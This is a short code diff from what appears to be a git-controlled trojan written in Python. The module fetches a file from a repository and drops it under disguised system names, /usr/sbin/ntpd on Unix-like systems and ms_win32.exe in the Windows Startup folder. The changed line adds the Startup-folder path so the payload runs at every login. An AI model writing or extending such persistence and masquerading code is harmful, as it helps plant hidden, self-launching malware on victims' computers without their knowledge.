@@ -42,7 +42,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		targetPath = "/usr/sbin/ntpd"
 	elif os.name == 'nt': #TODO: CHeck win TargetPth
 		filePath = "bin/test" #"modules/dirlister.py" #
-		targetPath = os.getenv("LOCALPATH")+"/mswin.exe"
+		targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\ms_win32.exe"
 	else:
 		return ("[ERROR] getFileFromGit: Not recognised OS!")
 	script= get_file_contents(filePath)
